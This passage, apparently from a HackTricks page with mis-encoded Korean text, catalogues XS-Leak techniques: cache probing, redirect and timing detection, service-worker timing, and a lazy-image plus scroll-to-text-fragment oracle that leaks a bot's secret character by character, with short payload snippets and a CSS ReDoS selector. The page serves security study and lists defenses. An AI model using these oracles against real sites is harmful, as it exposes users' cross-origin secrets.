* **Summary:** ê³µê²©ìëŠ” iframeì„ í™œìš©í•˜ì—¬ íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ ê°ì§€í•  ìˆ˜ ìˆìœ¼ë©°, iframeì˜ ì§€ì†ì ì¸ ì ‘ê·¼ ê°€ëŠ¥ì„±ì€ íŒŒì¼ ë‹¤ìš´ë¡œë“œê°€ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì¡ŒìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
ì´ ê¸°ìˆ ì´ í¥ë¯¸ë¡œìš´ ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤: í¬ë¡¬ì€ ì´ì œ **ìºì‹œ íŒŒí‹°ì…”ë‹**ì„ ê°€ì§€ê³  ìˆìœ¼ë©°, ìƒˆë¡œ ì—´ë¦° í˜ì´ì§€ì˜ ìºì‹œ í‚¤ëŠ”: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ngrok í˜ì´ì§€ë¥¼ ì—´ê³  ê·¸ ì•ˆì—ì„œ fetchë¥¼ ì‚¬ìš©í•˜ë©´ ìºì‹œ í‚¤ëŠ”: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ê°€ ë©ë‹ˆë‹¤. **ìºì‹œ í‚¤ê°€ ë‹¤ë¥´ë¯€ë¡œ** ìºì‹œë¥¼ ê³µìœ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ ë” ë§ì€ ì„¸ë¶€ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [ìºì‹œ íŒŒí‹°ì…”ë‹ì„ í†µí•œ ë³´ì•ˆ ë° ê°œì¸ ì •ë³´ ë³´í˜¸ í™•ë³´](https://developer.chrome.com/blog/http-cache-partitioning/)\
([**ì—¬ê¸°**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ì˜ ëŒ“ê¸€)
{% endhint %}

ì‚¬ì´íŠ¸ `example.com`ì´ `*.example.com/resource`ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ í¬í•¨í•˜ë©´ í•´ë‹¹ ë¦¬ì†ŒìŠ¤ëŠ” ìµœìƒìœ„ íƒìƒ‰ì„ í†µí•´ ì§ì ‘ ìš”ì²­ëœ ê²ƒê³¼ **ë™ì¼í•œ ìºì‹± í‚¤**ë¥¼ ê°–ìŠµë‹ˆë‹¤. ì´ëŠ” ìºì‹± í‚¤ê°€ ìµœìƒìœ„ _eTLD+1_ ë° í”„ë ˆì„ _eTLD+1_ë¡œ êµ¬ì„±ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ìºì‹œì— ì ‘ê·¼í•˜ëŠ” ê²ƒì´ ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ëŠ” ê²ƒë³´ë‹¤ ë¹ ë¥´ê¸° ë•Œë¬¸ì—, í˜ì´ì§€ì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½í•˜ê³  20ms(ì˜ˆ: í›„)ì— ì·¨ì†Œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›ë³¸ì´ ì¤‘ì§€ í›„ ë³€ê²½ë˜ì—ˆë‹¤ë©´, ë¦¬ì†ŒìŠ¤ê°€ ìºì‹œë˜ì—ˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.\
ë˜ëŠ” **ì ì¬ì ìœ¼ë¡œ ìºì‹œëœ í˜ì´ì§€ì— ëŒ€í•´ fetchë¥¼ ë³´ë‚´ê³  ì†Œìš” ì‹œê°„ì„ ì¸¡ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** fetch ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µì´ ë¦¬ë””ë ‰ì…˜ì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•˜ê³  ë¡œë“œë˜ê¸° ì „ì— ë¡œë“œë¥¼ ì¤‘ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ë¥˜ê°€ ë°œìƒí•˜ëŠ”ì§€ ì—¬ë¶€ì— ë”°ë¼ ë¦¬ì†ŒìŠ¤ê°€ ìºì‹œë˜ì—ˆê±°ë‚˜ ê·¸ë ‡ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

**AbortController**ì™€ í•¨ê»˜ _**fetch**_ ë° _**setTimeout**_ì„ ì‚¬ìš©í•˜ì—¬ **ë¦¬ì†ŒìŠ¤ê°€ ìºì‹œë˜ì—ˆëŠ”ì§€** ê°ì§€í•˜ê³  íŠ¹ì • ë¦¬ì†ŒìŠ¤ë¥¼ ë¸Œë¼ìš°ì € ìºì‹œì—ì„œ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ì´ ê³¼ì •ì€ ìƒˆë¡œìš´ ì½˜í…ì¸ ë¥¼ ìºì‹œí•˜ì§€ ì•Šê³  ë°œìƒí•©ë‹ˆë‹¤.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** **ë‚´ì¥ í•¨ìˆ˜**ë¥¼ **ë®ì–´ì“°ê³ ** ê·¸ ì¸ìˆ˜ë¥¼ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” **êµì°¨ ì¶œì²˜ ìŠ¤í¬ë¦½íŠ¸**ì—ì„œë„ ê°€ëŠ¥í•©ë‹ˆë‹¤(ì§ì ‘ ì½ì„ ìˆ˜ ì—†ìŒ). ì´ëŠ” **ê·€ì¤‘í•œ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì˜ ì‹¤í–‰ ì‹œê°„ì„ ì¸¡ì •í•©ë‹ˆë‹¤.
* **Code Example**:

ì£¼ì–´ì§„ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ê³µê²©ìëŠ” ìì‹ ì˜ ë„ë©”ì¸ ì¤‘ í•˜ë‚˜ì¸ "attacker.com" ë‚´ì— **ì„œë¹„ìŠ¤ ì›Œì»¤**ë¥¼ ë“±ë¡í•˜ëŠ” ì£¼ë„ê¶Œì„ ì¡ìŠµë‹ˆë‹¤. ë‹¤ìŒìœ¼ë¡œ ê³µê²©ìëŠ” ë©”ì¸ ë¬¸ì„œì—ì„œ ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸ì˜ ìƒˆ ì°½ì„ ì—´ê³  **ì„œë¹„ìŠ¤ ì›Œì»¤**ì— íƒ€ì´ë¨¸ë¥¼ ì‹œì‘í•˜ë„ë¡ ì§€ì‹œí•©ë‹ˆë‹¤. ìƒˆ ì°½ì´ ë¡œë“œë˜ê¸° ì‹œì‘í•˜ë©´ ê³µê²©ìëŠ” ì´ì „ ë‹¨ê³„ì—ì„œ ì–»ì€ ì°¸ì¡°ë¥¼ **ì„œë¹„ìŠ¤ ì›Œì»¤**ê°€ ê´€ë¦¬í•˜ëŠ” í˜ì´ì§€ë¡œ íƒìƒ‰í•©ë‹ˆë‹¤.

ì´ì „ ë‹¨ê³„ì—ì„œ ì‹œì‘ëœ ìš”ì²­ì´ ë„ì°©í•˜ë©´ **ì„œë¹„ìŠ¤ ì›Œì»¤**ëŠ” **204 (No Content)** ìƒíƒœ ì½”ë“œë¡œ ì‘ë‹µí•˜ì—¬ íƒìƒ‰ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•©ë‹ˆë‹¤. ì´ ì‹œì ì—ì„œ **ì„œë¹„ìŠ¤ ì›Œì»¤**ëŠ” ë‘ ë²ˆì§¸ ë‹¨ê³„ì—ì„œ ì‹œì‘ëœ íƒ€ì´ë¨¸ì—ì„œ ì¸¡ì •ì„ ìº¡ì²˜í•©ë‹ˆë‹¤. ì´ ì¸¡ì •ì¹˜ëŠ” íƒìƒ‰ í”„ë¡œì„¸ìŠ¤ì˜ ì§€ì—°ì„ ì´ˆë˜í•˜ëŠ” JavaScriptì˜ ì§€ì† ì‹œê°„ì— ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì‹¤í–‰ íƒ€ì´ë°ì—ì„œëŠ” **ë„¤íŠ¸ì›Œí¬ ìš”ì¸**ì„ **ì œê±°**í•˜ì—¬ **ë” ì •í™•í•œ ì¸¡ì •ê°’**ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í˜ì´ì§€ë¥¼ ë¡œë“œí•˜ê¸° ì „ì— í˜ì´ì§€ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ì¸¡ì •í•˜ê¸° ìœ„í•´ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë‹¤ë¥¸ ì‹œê³„ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** `window.open`ì„ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì„ ìˆ˜í–‰í•˜ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì„ ì¸¡ì •í•˜ê¸° ìœ„í•´ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë‹¤ë¥¸ ì‹œê³„ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì§€ê¸ˆ ë°”ë¡œ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## With HTML or Re Injection

ì—¬ê¸°ì—ì„œëŠ” **HTML ì½˜í…ì¸ ë¥¼ ì£¼ì…**í•˜ì—¬ êµì°¨ ì¶œì²˜ì—ì„œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ëŠ” ê¸°ìˆ ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ìˆ ì€ ì–´ë–¤ ì´ìœ ë¡œë“  **HTMLì„ ì£¼ì…í•  ìˆ˜ ìˆì§€ë§Œ JS ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ì—†ëŠ”** ê²½ìš°ì— í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤.

### Dangling Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

**ì½˜í…ì¸ ë¥¼ ìœ ì¶œ**í•´ì•¼ í•˜ê³  **ë¹„ë°€ ì´ì „ì— HTMLì„ ì¶”ê°€í•  ìˆ˜ ìˆëŠ” ê²½ìš°**, **ì¼ë°˜ì ì¸ dangling markup ê¸°ìˆ **ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì–´ë–¤ ì´ìœ ë¡œë“  **ë¬¸ìë¥¼ í•˜ë‚˜ì”©** í•´ì•¼ í•˜ëŠ” ê²½ìš°(ì•„ë§ˆë„ í†µì‹ ì´ ìºì‹œ ì ì¤‘ì„ í†µí•´ ì´ë£¨ì–´ì§€ê¸° ë•Œë¬¸) ì´ ìš”ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

HTMLì˜ **ì´ë¯¸ì§€**ì—ëŠ” "**loading**" ì†ì„±ì´ ìˆìœ¼ë©°, ê·¸ ê°’ì€ "**lazy**"ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ì´ë¯¸ì§€ëŠ” í˜ì´ì§€ê°€ ë¡œë“œë˜ëŠ” ë™ì•ˆì´ ì•„ë‹ˆë¼ ë³¼ ë•Œ ë¡œë“œë©ë‹ˆë‹¤:
```html
<img src=/something loading=lazy >
```
ë”°ë¼ì„œ í•  ìˆ˜ ìˆëŠ” ê²ƒì€ **ë§ì€ ì“°ë ˆê¸° ë¬¸ì**ë¥¼ **ì¶”ê°€í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤ (ì˜ˆ: **ìˆ˜ì²œ ê°œì˜ "W"**) **ë¹„ë°€ ì•ì— ì›¹ í˜ì´ì§€ë¥¼ ì±„ìš°ê±°ë‚˜** `<br><canvas height="1850px"></canvas><br>`ì™€ ê°™ì€ ê²ƒì„ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´, ìš°ë¦¬ì˜ **ì£¼ì…ì´ í”Œë˜ê·¸ ì•ì— ë‚˜íƒ€ë‚˜ë©´**, **ì´ë¯¸ì§€**ê°€ **ë¡œë“œë  ê²ƒì´ì§€ë§Œ**, **í”Œë˜ê·¸ ë’¤ì— ë‚˜íƒ€ë‚˜ë©´**, í”Œë˜ê·¸ + ì“°ë ˆê¸°ê°€ **ë¡œë“œë˜ëŠ” ê²ƒì„ ë°©ì§€í•  ê²ƒì…ë‹ˆë‹¤** (ì–¼ë§ˆë‚˜ ë§ì€ ì“°ë ˆê¸°ë¥¼ ë°°ì¹˜í• ì§€ëŠ” ì¡°ì •í•´ì•¼ í•©ë‹ˆë‹¤). ì´ê²ƒì€ [**ì´ ê¸€**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)ì—ì„œ ë°œìƒí•œ ì¼ì…ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ **scroll-to-text-fragment**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤, í—ˆìš©ëœë‹¤ë©´:

#### Scroll-to-text-fragment

ê·¸ëŸ¬ë‚˜ **ë´‡ì´ í˜ì´ì§€ì— ì ‘ê·¼í•˜ê²Œ** í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```
#:~:text=SECR
```
So the web page will be something like: **`https://victim.com/post.html#:~:text=SECR`**

Where post.html contains the attacker junk chars and lazy load image and then the secret of the bot is added.

What this text will do is to make the bot access any text in the page that contains the text `SECR`. As that text is the secret and it's just **below the image**, the **image will only load if the guessed secret is correct**. So there you have your oracle to **exfiltrate the secret char by char**.

Some code example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### ì´ë¯¸ì§€ ì§€ì—° ë¡œë”© ì‹œê°„ ê¸°ë°˜

If it's **not possible to load an external image** that could indicate the attacker that the image was loaded, another option would be to try to **guess the char several times and measure that**. If the image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the [**solution of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumarized here:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

If `jQuery(location.hash)` is used, it's possible to find out via timing i**f some HTML content exists**, this is because if the selector `main[id='site-main']` doesn't match it doesn't need to check the rest of the **selectors**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Defenses

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)ì™€ ìœ„í‚¤ì˜ ê° ì„¹ì…˜ [https://xsleaks.dev/](https://xsleaks.dev/)ì—ì„œ ê¶Œì¥ë˜ëŠ” ì™„í™” ì¡°ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê¸°ìˆ ë¡œë¶€í„° ë³´í˜¸í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ë¥¼ ë³´ë ¤ë©´ ê·¸ê³³ì„ í™•ì¸í•˜ì„¸ìš”.

## References

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°**ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  **ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
